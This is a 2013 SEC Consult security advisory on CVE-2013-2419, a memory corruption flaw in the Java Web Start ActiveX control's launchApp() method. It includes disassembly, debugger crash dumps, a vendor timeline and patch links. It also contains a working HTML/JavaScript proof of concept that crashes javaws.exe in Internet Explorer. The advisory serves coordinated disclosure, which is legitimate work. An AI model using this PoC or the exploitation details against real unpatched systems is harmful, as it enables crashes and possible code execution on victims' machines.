@@ -1,0 +1,183 @@
+SEC Consult Vulnerability Lab Security Advisory < 20130417-1 >
+=======================================================================
+              title: Java ActiveX Control Memory Corruption
+            product: Java(TM) Web Start Launcher
+ vulnerable version: Sun Java Version 7 Update 17 and before
+                     Sun Java Version 6 Update 43 and before
+                     Sun Java Version 5.0 Update 41 and before
+      fixed version: Patch information see sections below
+                CVE: CVE-2013-2419
+             impact: medium
+           homepage: http://www.java.com/
+              found: 2012-11-13
+                 by: A. Antukh
+                     SEC Consult Vulnerability Lab
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"To date, the Java platform has attracted more than 9 million software
+developers. It's used in every major industry segment and has a presence
+in a wide range of devices, computers, and networks.
+
+Java technology's versatility, efficiency, platform portability, and
+security make it the ideal technology for network computing. From laptops
+to datacenters, game consoles to scientific supercomputers, cell phones to
+the Internet, Java is everywhere!"
+
+Source: http://www.java.com/en/about/
+
+
+Vulnerability overview/description:
+-----------------------------------
+Memory corruption vulnerability exists in the launchApp() method of the
+deployJava1.dll which is loaded by Internet Explorer and used to launch
+javaws.exe with provided arguments. The second (optional) parameter that
+is responsible for embedded data is checked improperly, which causes memory
+corruption and reading from arbitrary address if specific conditions are met.
+
+Successful exploitation of this vulnerability could potentially result in
+an arbitrary code execution within the Java(TM) Web Start Launcher or cause
+the application to crash.
+
+
+Vulnerability details:
+-----------------
+The launchApp() method expects the following arguments: *pJNLP, *pEmbedded
+(optional) and *pVmArgs (optional). Providing a single wrong *pJNLP argument
+causes an application to prompt an error message and exit. However, if an
+attacker provides the second argument, it will be checked before quitting.
+
+The function responsible for processing an auto-generated temp file containing
+input args is the following:
+
+.text:0040560F                 push    eax              ; size of input data
+.text:00405610                 push    esi              ; malcrafted string
+.text:00405611                 call    tmp_processing
+
+If the input length doesn't satisfy condition of bitwise AND, the function
+returns zero and exits:
+
+.text:0040950B                 mov     edx, [ebp+arg_4]
+.text:0040950E                 test    dl, 3            ; if size satisfies condition          
+.text:00409511                 jz      short loc_409517 ; jump to processing
+.text:00409513                 xor     eax, eax         ; otherwise return 0 and exit
+.text:00409515                 leave
+.text:00409516                 retn
+
+The returned data is used later to write from, causing an access violation:
+
+.text:00405611                 call    tmp_processing
+.text:00405616                 mov     esi, eax
+...
+(cc0.9fc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00155a10 ebx=00000000 ecx=00000008 edx=ffd21610 esi=00000000 edi=00000001
+eip=00402a0d esp=0012e6a8 ebp=0012e734 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+javaws+0x2a0d:
+00402a0d 8b86cc000000    mov     eax,dword ptr [esi+0CCh] ds:0023:000000cc=????????
+
+However, if the size fits the condition of bitwise AND, the program flow
+continues. The memory of input string length size is allocated:
+
+.text:00409547                 push    eax             ; size_t
+.text:00409548                 mov     [ebp+var_4], ecx
+.text:0040954B                 call    _malloc
+
+First WORD of the malformed string is taken and compared to 3Dh (equal sign '=')
+to ignore it. If the WORD is not equal to 3Dh, data from the calculated offset from
+input string is read.
+
+.text:00409571                 cmp     ecx, 3Dh
+.text:00409574                 jnz     short crash_place
+.text:00409576                 xor     ecx, ecx
+.text:00409578                 jmp     short loc_409582
+.text:0040957A ; ---------------------------------------------------------------------------
+.text:0040957A
+.text:0040957A crash_place:                            ; CODE XREF: tmp_processing+97j
+.text:0040957A                 movzx   ecx, word_445670[ecx*2]
+
+If the resulting offset points to unallocated memory, an access violation
+exception is thrown:
+
+eax=001542a0 ebx=001559f8 ecx=0000aaee edx=00000000 esi=00000000 edi=001558c8
+eip=0040957a esp=0012e650 ebp=0012e668 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+javaws+0x957a:
+0040957a 0fb70c4d70564400 movzx   ecx,word ptr javaws+0x45670 (00445670)[ecx*2] ds:0023:0045ac4c=????
+
+When carefully calculated, this could potentially lead to arbitrary code
+execution.
+
+The following PoC code can be used to test this vulnerability. It will crash the
+javaws.exe process when opened in Internet Explorer.
+
+<HTML>
+<HEAD>
+<TITLE>Java ActiveX component memory corruption</TITLE>
+</HEAD>
+<BODY>
+<OBJECT id='javaws' classid='clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA'></object>
+<SCRIPT>
+    function Exploit(){
+        var dword=unescape("%uAAAA%uBBBB");
+        for( mem = ""; mem.length<0x2F; mem +=dword );
+        javaws.launchApp(mem,mem,mem);
+    }
+    Exploit();
+</SCRIPT>
+</BODY>
+</HTML>
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerability has been verified to exist in Java(TM) Platform SE 7 U9,
+which was the most recent version at the time of discovery.
+
+
+Vendor contact timeline:
+------------------------
+2012-11-16: Contacted vendor through secalert_us@oracle.com
+2012-11-17: Initial vendor response - issues will be verified
+2012-11-30: Vulnerability is confirmed and reproduced by the vendor
+2013-02-25: Under investigation / Being fixed in main codeline
+2013-03-26: Issue fixed in main codeline, scheduled for a future CPU
+2013-04-13: Oracle: Advisory and patches will be released on 2013-04-16
+2013-04-16: Oracle releases April 2013 CPU
+2013-04-17: Public release of SEC Consult advisory
+
+
+Solution:
+---------
+Apply latest patches, see:
+http://www.oracle.com/technetwork/topics/security/javacpuapr2013-1928497.html
+
+
+Workaround:
+-----------
+No workaround is available.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Unternehmensberatung GmbH
+
+Office Vienna
+Mooslackengasse 17
+A-1190 Vienna
+Austria
+
+Tel.: +43 / 1 / 890 30 43 - 0
+Fax.: +43 / 1 / 890 30 43 - 25
+Mail: research at sec-consult dot com
+https://www.sec-consult.com
+
+EOF A. Antukh / @2013
